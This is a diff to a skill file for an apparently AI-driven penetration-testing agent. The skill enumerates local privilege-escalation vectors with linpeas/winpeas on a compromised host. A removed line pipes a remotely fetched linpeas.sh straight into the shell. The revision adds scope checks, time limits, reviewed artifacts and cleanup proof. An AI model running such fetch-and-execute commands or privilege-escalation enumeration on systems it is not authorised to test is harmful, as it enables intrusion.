@@ -5,11 +5,12 @@ description: >
   host with linpeas/winpeas (PEASS-ng) — SUID, capabilities, cron, creds, misconfigs, kernel —
   then turn red/yellow highlights into concrete abuse via GTFOBins/LOLBAS. Runs after a foothold
   skill; feeds the privesc exploit step. Not for remote/network enum (nmap/netexec).
-arguments: "lhost_url [os]"
+arguments: "target transport [reviewed_peass_path]"
 model: inherit
 effort: medium
-context: inline
-agent:
+context: fork
+agent: vuln-hunter
+background: false
 category: privesc-creds
 domain: host
 ---
@@ -19,15 +20,15 @@ domain: host
 Shared contract: see AGENTS.md.
 
 ## Goal
-Surface likely local privilege-escalation vectors (SUID, caps, cron, creds, misconfigs, kernel) on a
-compromised host, capture the full output, and turn the highest-signal highlights into a verified path.
+Find one useful local privilege hypothesis from cheap context first; use PEASS only when justified.
+Colored highlights are candidates, never verified privilege escalation.
 
 ## Steps
-1. Identify the foothold `TARGET`. `RUN="$(python3 -I scripts/otus-log.py init --engagement "$ENGAGEMENT" --skill linpeas --target "$TARGET")"`; `python3 -I scripts/otus-log.py scope-check --engagement "$ENGAGEMENT" --target "$TARGET" --run-dir "$RUN"`; nonzero STOP. linpeas is noisy/slow; record the one-shot transport.
-2. Wrap the recorded timeout-bounded transport with `python3 -I scripts/otus-log.py run --run-dir "$RUN" --target "$TARGET" -- <original transport argv>`. On-target command remains `curl <lhost_url>/linpeas.sh | sh -s -- -a 2>&1 | tee /tmp/linpeas.txt` (Windows: `winPEASx64.exe > winpeas.txt`). Use only reviewed script sources; capture output locally as `linpeas.txt` and record/remove created remote artifacts with positive cleanup proof.
-3. **Focus red/yellow highlights.** PEASS colour-codes the most promising findings — triage those first, not the whole dump.
-4. **Cross-check vectors.** Map each candidate (SUID, writable cron, sudo rule, capability, kernel) against **GTFOBins / LOLBAS** and known CVEs for a concrete abuse command; record each + its command in `notes/vectors.md`.
-5. Hand verified vector candidates to privesc-root; any extra target check uses the helper. `python3 -I scripts/otus-log.py finish --run-dir "$RUN" --status "$STATUS" --summary "$SUMMARY" --item 'scope-confirmed=ok:../../scope.json' --item 'enum-captured=ok:linpeas.txt' --item 'vectors-analyzed=ok:notes/vectors.md' --item 'results-recorded=ok:findings.md'`; include actual artifact/cleanup fields and verified findings, or `none identified`.
+1. Identify proved foothold TARGET/transport. `RUN="$(python3 -I scripts/otus-log.py init --engagement "$ENGAGEMENT" --skill linpeas --target "$TARGET" --profile local-context --coverage-set 'Selected cheap local-context checks')"`; `python3 -I scripts/otus-log.py scope-check --engagement "$ENGAGEMENT" --target "$TARGET" --run-dir "$RUN"`; nonzero STOP. Write notes/task.md with known OS/access, hypothesis, <=240-second total task and PEASS trigger; record transport privately.
+2. Reuse prior context, or one <=30-second helper-wrapped one-shot for `id; uname -a; pwd; ls -la ~`, with matching remote-native bounds. Inspect a selected known rule/path/version next only if it discriminates the hypothesis. No default filesystem-wide SUID/capability search, process watcher or kernel-exploit stage.
+3. If cheap checks fail to discriminate and allocation permits, stage only a locally reviewed/versioned PEASS artifact at a unique remote path. No download-to-shell, default `-a`, remote tee/output file or automatic winPEAS ladder. Execute once with remote-native <=150-second bound and local `python3 -I scripts/otus-log.py run --run-dir "$RUN" --target "$TARGET" --timeout 180 --grace 5 -- <verified one-shot transport argv>`; save actual output in evidence/peass.txt. Unsupported remote bounds -> do not launch; hard failure -> stop and disclose owed cleanup.
+4. Cross-check <=3 relevant candidates against actual version/permission/path and GTFOBins/LOLBAS/CVE prerequisites. Record confirmed facts, rejected leads and unknowns in notes/vectors.md; no exploitation here. Save actual context/PEASS coverage, skips and artifact/cleanup state in notes/assessment.md; remove staged artifacts with positive exact-path absence proof only after normally ended commands.
+5. Set PROFILE/COVERAGE to actual context-only or justified PEASS set. `python3 -I scripts/otus-log.py finish --run-dir "$RUN" --status "$STATUS" --summary "$SUMMARY" --profile "$PROFILE" --coverage-set "$COVERAGE" --stop-reason "$STOP" --omitted 'Unselected enumeration and exploitation' --item 'scope-confirmed=ok:../../scope.json' --item 'enum-captured=ok:events.jsonl' --item 'vectors-analyzed=ok:notes/vectors.md' --item 'results-recorded=ok:notes/assessment.md'`; include only verified facts/findings with actual state/artifacts/cleanup. Completed selected checks can be negative; native unfinished is partial, helper failure error. Return candidates to coordinator, never start privesc-root.
 
 ## Modern tooling & alternatives
 PEASS-ng: `linpeas.sh` (Linux), `winPEASx64.exe` (Windows). Companions: `pspy` (watch cron/processes
@@ -43,22 +44,22 @@ checklist:
     on_fail: fail
     required: true
   - id: enum-captured
-    desc: linpeas/winpeas run and full output captured into the run directory
-    verify: nonempty
-    evidence: linpeas.txt
-    on_fail: redo-skill
+    desc: Actual events/context or conditional PEASS output substantiate selected enumeration
+    verify: judge
+    evidence: events.jsonl
+    on_fail: fail
     required: true
   - id: vectors-analyzed
     desc: Highlights cross-checked against GTFOBins/LOLBAS/CVEs; candidates recorded (or "none")
-    verify: nonempty
+    verify: judge
     evidence: notes/vectors.md
     on_fail: redo-part
     required: true
   - id: results-recorded
-    desc: Run marker written (even when no vector found)
-    verify: nonempty
-    evidence: findings.md
-    on_fail: redo-skill
+    desc: Actual coverage, omitted checks and exact artifact/cleanup state evidenced
+    verify: judge
+    evidence: notes/assessment.md
+    on_fail: fail
     required: true
 ```
 
